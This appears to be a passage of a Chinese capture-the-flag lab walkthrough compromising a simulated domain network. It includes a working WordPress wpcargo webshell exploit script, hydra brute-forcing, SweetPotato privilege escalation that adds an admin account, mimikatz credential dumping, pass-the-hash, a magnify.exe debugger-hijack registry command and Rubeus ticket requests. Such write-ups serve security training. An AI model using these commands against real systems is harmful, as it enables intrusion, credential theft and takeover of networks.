class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[redis@centos-web01 db]$ <span class="built_in">base64</span> <span class="string">&quot;/home/redis/flag/flag01&quot;</span> | <span class="built_in">base64</span> --decode</span><br><span class="line"><span class="built_in">base64</span> <span class="string">&quot;/home/redis/flag/flag01&quot;</span> | <span class="built_in">base64</span> --decode</span><br><span class="line"> ??????                    ??              ??  ???????                           ??</span><br><span class="line">????????                  ???             ??? ?????????                         ???</span><br><span class="line">??   ???  ?????? ??   ?? ??????  ?????   ? ?? ???   ???   ??????   ??????       ???</span><br><span class="line">???????  ??????????  ?????????  ??????? ??????????????   ???????? ????????   ??????</span><br><span class="line">?????? ?? ??? ? ???  ???  ???  ?????????????? ????????  ???   ???  ???????  ???????</span><br><span class="line">??    ??? ???   ???  ???  ???  ???????     ?? ???  ???? ???   ??? ???????? ???  ???</span><br><span class="line">???????? ????   ????????  ???? ????????    ?? ???   ???????????? ??????????????????</span><br><span class="line">???????  ???     ??????    ??   ??????     ?  ??     ??  ??????   ????????  ?????? </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag01: flag&#123;66dd3387-14bc-4c73-8132-28ed3237ed6b&#125;</span><br><span class="line"></span><br><span class="line">Congratulations! ! !</span><br><span class="line">Guess <span class="built_in">where</span> is the second flag?</span><br></pre></td></tr></table></figure><p>继续信息收集</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/16.png"></p><p>传fscan</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/17.png"></p><p>可以看到内网ip为172.22.2.7</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x ./fscan</span><br><span class="line">./fscan -h 172.22.2.0/24</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">[2025-04-16 15:23:22] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-16 15:23:22] [INFO] CIDR范围: 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 解析CIDR 172.22.2.0/24 -&gt; IP范围 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-04-16 15:23:22] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-04-16 15:23:22] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)</span><br><span class="line">[2025-04-16 15:23:22] [SUCCESS] 目标 172.22.2.7      存活 (ICMP)</span><br><span class="line">[2025-04-16 15:23:22] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)</span><br><span class="line">[2025-04-16 15:23:22] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)</span><br><span class="line">[2025-04-16 15:23:22] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)</span><br><span class="line">[2025-04-16 15:23:28] [INFO] 存活主机数量: 5</span><br><span class="line">[2025-04-16 15:23:28] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.3:88</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.7:21</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.16:80</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.18:80</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.18:22</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.7:80</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.7:22</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.3:135</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.34:445</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.18:445</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.16:445</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.3:445</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.3:389</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.34:139</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.18:139</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.16:139</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.3:139</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.34:135</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.16:135</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.16:1433</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 端口开放 172.22.2.7:6379</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 服务识别 172.22.2.7:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class="line">[2025-04-16 15:23:28] [SUCCESS] 服务识别 172.22.2.18:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-16 15:23:29] [SUCCESS] 服务识别 172.22.2.7:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-04-16 15:23:33] [SUCCESS] 服务识别 172.22.2.3:88 =&gt; </span><br><span class="line">[2025-04-16 15:23:33] [SUCCESS] 服务识别 172.22.2.16:80 =&gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.7:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.34:445 =&gt; </span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.16:445 =&gt; </span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.3:445 =&gt; </span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.3:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.34:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.16:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.3:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-16 15:23:34] [SUCCESS] 服务识别 172.22.2.16:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]</span><br><span class="line">[2025-04-16 15:23:36] [SUCCESS] 服务识别 172.22.2.18:80 =&gt; [http]</span><br><span class="line">[2025-04-16 15:24:29] [SUCCESS] 服务识别 172.22.2.18:445 =&gt; </span><br><span class="line">[2025-04-16 15:24:29] [SUCCESS] 服务识别 172.22.2.18:139 =&gt; </span><br><span class="line">[2025-04-16 15:24:29] [SUCCESS] 服务识别 172.22.2.7:6379 =&gt; </span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 服务识别 172.22.2.3:135 =&gt; </span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 服务识别 172.22.2.34:135 =&gt; </span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 服务识别 172.22.2.16:135 =&gt; </span><br><span class="line">[2025-04-16 15:24:34] [INFO] 存活端口数量: 21</span><br><span class="line">[2025-04-16 15:24:34] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-16 15:24:34] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.16</span><br><span class="line">主机名: MSSQLSERVER</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.16</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.3</span><br><span class="line">主机名: DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.3</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.34</span><br><span class="line">主机名: CLIENT01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.34</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-16 15:24:34] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-16 15:24:34] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="line">[2025-04-16 15:24:34] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456</span><br><span class="line">[2025-04-16 15:24:34] [INFO] SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[<span class="built_in">print</span>$ IPC$]</span><br><span class="line">[2025-04-16 15:24:35] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点</span><br><span class="line">[2025-04-16 15:24:36] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="line">[2025-04-16 15:24:42] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">172.22.2.16  MSSQLSERVER.xiaorang.lab  mssql数据库服务器 </span><br><span class="line">172.22.2.7   Redis                    已拿下</span><br><span class="line">172.22.2.34  XIAORANG\CLIENT01</span><br><span class="line">172.22.2.3    DC:DC.xiaorang.lab</span><br><span class="line">172.22.2.18   WORKGROUP\UBUNTU-WEB02  wordspress网站 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看见wp，直接开扫</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains wpscan --url http://172.22.2.18 --api-token</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/18.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/19.png"></p><p>直接搜索，拿exp打</p><p><a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/">https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a magic string that when treated as pixels and compressed using the png</span></span><br><span class="line"><span class="comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span></span><br><span class="line">payload = <span class="string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span></span><br><span class="line"></span><br><span class="line">def encode_character_code(c: int):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.format(c).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.<span class="built_in">join</span>([encode_character_code(c) <span class="keyword">for</span> c <span class="keyword">in</span> binascii.unhexlify(payload)])[1:]</span><br><span class="line"></span><br><span class="line">destination_url = <span class="string">&#x27;http://172.22.2.18/&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;ls&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span></span><br><span class="line">requests.get(</span><br><span class="line">    f<span class="string">&quot;&#123;destination_url&#125;wp-content/plugins/wpcargo/includes/barcode.php?text=&#123;text&#125;&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span></span><br><span class="line"><span class="built_in">print</span>(requests.post(</span><br><span class="line">    f<span class="string">&quot;&#123;destination_url&#125;webshell.php?1=system&quot;</span>, data=&#123;<span class="string">&quot;2&quot;</span>: cmd&#125;</span><br><span class="line">).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/20.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/21.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/22.png"></p><p>挂载代理后访问，发现攻击成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/23.png"></p><p>蚁剑直接连接成功</p><p>wp的话 一般会直接在配置文件直接写下数据库的账号密码</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/24.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database username */</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wpuser&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database password */</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;WpuserEha8Fgj9&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database hostname */</span><br><span class="line">define( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database charset to use <span class="keyword">in</span> creating database tables. */</span><br><span class="line">define( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/25.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/26.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/27.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/28.png"></p><p>拿下flag02</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c757e423-eb44-459c-9c63-7625009910d8&#125;</span><br></pre></td></tr></table></figure><p>:::info<br>**172.22.2.16  MSSQLSERVER.xiaorang.lab  mssql数据库服务器 **</p><p><strong>172.22.2.7   Redis                    已拿下</strong></p><p><strong>172.22.2.34  XIAORANG\CLIENT01</strong></p><p><strong>172.22.2.3    DC:DC.xiaorang.lab</strong></p><p><strong>172.22.2.18   WORKGROUP\UBUNTU-WEB02  wordspress网站 已拿下</strong></p><p>:::</p><p>发现还写了一些我可能会感兴趣的东西</p><p>还写了是密码，说明可能是密码本，同时信息收集得知还有一台mssql</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/29.png"></p><p>把限制20条去掉，直接导出</p><p>我们也知道mssql的账号为sa</p><p>这里我们尝试爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q hydra -l sa -P password.txt mssql://172.22.2.16</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我用hydra没爆破成功</p><p>那么我们用tscan和fscan试试</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/30.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/31.png"></p><p>爆破成功，得多试几次</p><p>使用MDUT二开版连接成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/32.png"></p><p>再次信息收集</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/33.png"></p><p>发现拥有<font style="color:rgb(255, 182, 0);">SeImpersonatePrivilege权限</font></p><p>那么可以使用土豆进行提权</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/34.png"></p><p>激活一下组件</p><p>上传</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/35.png"></p><p>这里发现攻击成功 但是执行命令不回显（复盘发现其实不是MDUT的问题，是exp的问题）</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/36.png" alt="复盘时的图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a <span class="string">&quot;netstat -ano&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/37.png"></p><p>使用哥斯拉重新弄</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/38.png"></p><p>还是这样</p><p>才发现，这个exe不可以回显</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a <span class="string">&quot;net user Hundredsu qwer123! /add&quot;</span></span><br><span class="line"></span><br><span class="line">C:/Users/Public/SweetPotato.exe -a <span class="string">&quot;net localgroup administrators Hundredsu /add&quot;</span></span><br></pre></td></tr></table></figure><p>那就不管了，直接增加用户rdp</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/39.png"></p><p>还是失败</p><p>最后发现是<a href="https://github.com/uknowsec/SweetPotato/blob/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe"><font style="color:rgb(240, 246, 252) !important;">SweetPotato</font></a><font style="color:rgb(240, 246, 252) !important;">的问题</font></p><p><font style="color:rgb(240, 246, 252) !important;">这里试了n个SweetPotato</font></p><p><font style="color:rgb(240, 246, 252) !important;">终于成功了</font></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/40.png"></p><p>直接翻文件</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/41.png"></p><p>:::info<br><strong>172.22.2.16  MSSQLSERVER.xiaorang.lab  mssql数据库服务器  已拿下</strong></p><p><strong>172.22.2.7   Redis                    已拿下</strong></p><p><strong>172.22.2.34  XIAORANG\CLIENT01</strong></p><p><strong>172.22.2.3    DC:DC.xiaorang.lab</strong></p><p><strong>172.22.2.18   WORKGROUP\UBUNTU-WEB02  wordspress网站 已拿下</strong></p><p>:::</p><p>已经拿到域内的主机了，就可以尝试能不能成功横向DC了</p><p>传mimikatz</p><p>以本地管理员权限的powershell打开就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line"><span class="built_in">log</span> 1.txt  <span class="comment">#将hash记录在1.txt，方便查找</span></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/42.png"></p><p>记得管理员权限</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/43.png"></p><p>抓取到hash，尝试各种横向，但是都没成功</p><p>接下来的工具 注意使用的角色</p><p><strong>信息收集</strong></p><p>由于前面各种横向都没成</p><p>那么接下来探针一下，是否可以进行<strong>委派攻击</strong></p><p>下面这条命令使用 <code>MSSQLSERVER$</code> 账户的 NTLM 哈希值来模拟该账户的凭据，从而在本地系统上运行 PowerShell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:MSSQLSERVER$ /domain:xiaorang.lab /ntlm:2f09fa55bd93e0be3c9d6cc3a617ad56 /run:powershell</span><br></pre></td></tr></table></figure><p>还有一种方法可以以机器账户的身份登录的就是使用镜像劫持</p><p>也就是放大镜提权</p><p>管理员运行cmd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v <span class="string">&quot;Debugger&quot;</span> /t REG_SZ /d <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure><p>然后锁定屏幕，点击放大镜就可以获取system的cmd</p><p>收集判断是否为约束委派账户，需要在机器账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line">.\AdFind.exe -b <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/44.png"></p><p>我打的时候没成功，这里贴一张suuu师傅的展示一下使用过程</p><p>另一种探测是否存在可以利用委派攻击的账户</p><p>放大镜提权后</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/45.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line"></span><br><span class="line">Get-DomainComputer -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p>由上面可以发现 <code>MSSQLSERVER$</code> 机器配置了到 DC LDAP 和 CIFS 服务的约束性委派</p><p>接下来进行约束委派攻击</p><p>将Rubeus.exe传上去</p><p>接下来就不需要系统用户了，就是不需要在域内的用户的权限执行了</p><p>在rdp好操作一些</p><p>直接使用本地的administrator的powershell开始操作</p><ol><li><strong>第一步</strong>使用 <a href="https://c1trus.top/26-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%9F%9F%E5%86%85%E6%AD%A6%E5%99%A8%E5%8C%96%E5%B7%A5%E5%85%B7.html#6._Rubeus_0">Rubeus</a> 与 <code>MSSQLSERVER$</code> 的凭证向<strong>KDC</strong>(密钥分发中心)申请一个<strong>TGT</strong>(票据授权票据) 并用base64格式打印出来</li></ol><p><strong>rc4处为前面获取到的ntlm的hash</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:2f09fa55bd93e0be3c9d6cc3a617ad56 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 